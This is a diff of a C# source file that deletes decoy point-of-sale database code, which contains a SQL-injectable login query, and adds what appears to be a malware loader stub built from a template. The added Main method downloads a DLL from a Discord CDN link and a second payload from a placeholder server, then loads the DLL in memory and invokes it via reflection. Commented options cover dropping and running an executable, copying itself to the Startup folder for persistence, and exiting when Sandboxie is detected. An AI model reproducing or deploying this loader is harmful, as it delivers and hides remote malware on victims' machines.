@@ -1,22 +1,15 @@
-using Microsoft.VisualBasic;
-using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.IO;
 using System.Linq;
 using System.Net;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using Microsoft.VisualBasic.CompilerServices;
-using System.Runtime.InteropServices;
-using System.Security;
-using System.Text;
-using System.ComponentModel;
-using System.Data;
-using System.Data.SqlClient;
+
+
 
 //Default [assembly: AssemblyTitle("Coğrafyalar Programı")]
 //Default [assembly: AssemblyDescription("Cografyalar")]
@@ -31,180 +24,79 @@ using System.Data.SqlClient;
 //Assembly [assembly: AssemblyProduct("{4}")]
 //Assembly [assembly: AssemblyCopyright("{5}")]
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
-namespace POSBunifu.Config
+namespace sharp
 {
-    class SQLSelects
-    {
-
-        public SqlConnection strcon = new SqlConnection("Data Source=DESKTOP-2LLV29I\\MSSQLSERVER01;Database=dbpos;trusted_connection=true;");
-        public SqlCommand cmd = new SqlCommand();
-        public SqlDataAdapter da = new SqlDataAdapter();
-        public DataTable dt = new DataTable();
-        public int result;
-
-
-        public void ValidatingProduct(string sqlselect, string sqladd, string sqledit)
-        {
-            try
-            {
-                strcon.Open();
-
-                cmd = new SqlCommand();
-                cmd.Connection = strcon;
-                cmd.CommandText = sqlselect;
-                da = new SqlDataAdapter();
-                da.SelectCommand = cmd;
-                dt = new DataTable();
-                da.Fill(dt);
-
-                int maxrows = dt.Rows.Count;
-
-                if (maxrows > 0)
-                {
-                    //updating in the database; 
-                    cmd = new SqlCommand();
-                    cmd.Connection = strcon;
-                    cmd.CommandText = sqledit;
-                    result = cmd.ExecuteNonQuery();
-
-
-                    if (result > 0)
-                    {
-                        //updating Qty in the database; 
-                        cmd = new SqlCommand();
-                        cmd.Connection = strcon;
-                        cmd.CommandText = "";
-                        result = cmd.ExecuteNonQuery();
-
-
-
-                        MessageBox.Show("");
-                    }
-
-                }
-                else
-                {
-                    //adding in the database
-                    cmd = new SqlCommand();
-                    cmd.Connection = strcon;
-                    cmd.CommandText = sqladd;
-                    result = cmd.ExecuteNonQuery();
-                    if (result > 0)
-                    {
-                        MessageBox.Show("");
-
-                    }
-                }
-
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(ex.Message);
-            }
-            finally
-            {
-                strcon.Close();
-            }
-
-        }
-        public void ValidatingAccounts(TextBox txtusername, TextBox txtpass)
-        {
-            try
-            {
-                strcon.Open();
-
-                cmd = new SqlCommand();
-                cmd.Connection = strcon;
-                cmd.CommandText = "SELECT * FROM tbluser WHERE User_name ='" + txtusername.Text + "' AND Pass = '" + txtpass.Text + "'";
-                da = new SqlDataAdapter();
-                da.SelectCommand = cmd;
-                dt = new DataTable();
-                da.Fill(dt);
-
-                //int maxrows = dt.Rows.Count;
-
-                //if (maxrows > 0)
-                //{
-                //    MessageBox.Show("Welcome " + dt.Rows[0].Field<string>("UserRole"), "Accepted", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                //    frmLogin frm = new frmLogin();
-                //    frm.Close();
-                //}
-                //else
-                //{
-                //    MessageBox.Show("Account does not exist! ", "Not Exist", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
-
-                //}
-
-            }
-            catch (Exception ex)
-            {
-                //MessageBox.Show(ex.Message);
-            }
-            finally
-            {
-                strcon.Close();
-            }
-
-        }
-    }
-}
-
     static class Program
     {
-   
+
+        [STAThread]
         static void Main()
         {
+            using (WebClient webclient = new WebClient())
+            {
+
+                try
+                {
+                 //sandboxie controlsandboxie();
+
+                    //Messega
 
 
 
-                //sandboxie controlsandboxie();
-
-                //Messega
-
-
-
-                //download try
-                //download {
-                //download  System.Net.WebClient appyrun = new System.Net.WebClient();
-                //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-                //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-                //download }
-                //download catch
-                //download {
-                //download }
-
-
-                WebClient webclient = new WebClient();
-
-                Assembly bilmiyorum = AppDomain.CurrentDomain.Load(webclient.DownloadData("https://cdn.discordapp.com/attachments/841595401253158954/842759705482231828/run.dll"));
-
-                object iletisim = new object[] { %aPP%, string.Empty, webclient.DownloadData("%Server%"), true };
-
-                bilmiyorum.GetType("IsolatedStorage.packet_server").InvokeMember("CodeAccessSecurityAttribute", BindingFlags.InvokeMethod, null, null, (object[])iletisim);
+                    //download try
+                    //download {
+                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
+                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
+                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
+                    //download }
+                    //download catch
+                    //download {
+                    //download }
 
 
 
 
-                //start  {
-                //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
-                //start  }
+                 
+                
+            
 
+                   byte[] webData = webclient.DownloadData("https://cdn.discordapp.com/attachments/841595401253158954/842759705482231828/run.dll");
+
+
+                    object iletisim = new object[] { %aPP%, string.Empty, webclient.DownloadData("%Server%"), true };
+
+
+                    AppDomain.CurrentDomain.Load(webData).GetType("IsolatedStorage.packet_server").InvokeMember("CodeAccessSecurityAttribute", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])iletisim);
+
+
+                        //start  {
+                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
+                    //start  }
+
+
+
+
+                }
+                catch { return; }
+
+
+
+
+                   
 
 
             }
-            //burası sadece çöp kod silebilirsin
-
-            //sandboxie [DllImport("kernel32.dll")]
-            //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
-            //sandboxie static void controlsandboxie()
-            //sandboxie {
-            //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
-            //sandboxie     {
-            //sandboxie        Environment.Exit(1);
-            //sandboxie     }
-            //sandboxie }
 
         }
 
-
-    
+        //sandboxie [DllImport("kernel32.dll")]
+        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
+        //sandboxie static void controlsandboxie()
+        //sandboxie {
+        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+        //sandboxie     {
+        //sandboxie        Environment.Exit(1);
+        //sandboxie     }
+        //sandboxie }
+    }
+}
